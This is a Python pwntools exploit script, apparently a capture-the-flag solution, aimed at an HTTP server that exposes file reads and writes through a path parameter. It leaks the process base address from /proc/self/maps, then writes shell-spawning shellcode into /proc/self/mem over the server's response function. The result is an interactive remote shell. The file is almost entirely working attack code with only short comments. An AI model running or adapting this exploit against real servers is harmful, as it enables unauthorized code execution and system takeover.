from pwn import *

context.arch = 'amd64'
context.os = 'linux'

host = 'challenges.1pc.tf'
port = <port>

io = remote(host, port)

# =========================================================================
# STEP 1: INFORMATION LEAK (KASLR BYPASS)
# =========================================================================
log.info("Read /proc/self/maps to leak Base Address")

# Construct HTTP Request
req_get = f"GET /?path=/proc/self/maps HTTP/1.1\r\n"
req_get += f"Host: {host}\r\n"
req_get += "Connection: keep-alive\r\n\r\n"
io.send(req_get.encode())

# Parsing response to keep TCP stream sync
io.recvuntil(b"Content-Length: ")
content_length = int(io.recvuntil(b"\r").strip())
io.recvuntil(b"\r\n\r\n")
maps_data = io.recv(content_length).decode()

# Find first line with /app/server path
base_addr = 0
for line in maps_data.splitlines():
  if "/app/server" in line:
      base_addr = int(line.split('-')[0], 16)
      break

if base_addr == 0:
  log.error("Failed to find Base Address!")
  exit(1)

log.success(f"Base Address Server found: {hex(base_addr)}")

# =========================================================================
# STEP 2: SHELLCODE & OFFSET CALCULATION
# =========================================================================
# Offset Server::send_response func from 'nm'
offset_send_response = 0x22d4c
target_addr = base_addr + offset_send_response
log.success(f"Target overwrite (Server::send_response): {hex(target_addr)}")

# Create shellcode: Redirect I/O (stdin, stdout, stderr) to fd in 'rsi' then execute /bin/sh
shellcode = asm(shellcraft.dupsh('rsi'))
log.info(f"Shellcode created ({len(shellcode)} bytes)")

# =========================================================================
# STEP 3: ARBITRARY MEMORY WRITE & TRIGGER
# =========================================================================
log.info("Overwriting memory instruction via /proc/self/mem")

# format target_addr to num string
req_put = f"PUT /?path=/proc/self/mem&offset={target_addr} HTTP/1.1\r\n"
req_put += f"Host: {host}\r\n"
req_put += "Connection: close\r\n"
req_put += f"Content-Length: {len(shellcode)}\r\n\r\n"

# Send HTTP header HTTP and put shellcode as body
payload = req_put.encode() + shellcode
io.send(payload)

log.success("Payload sent")
log.success("run 'cat /flag*'")

io.interactive()
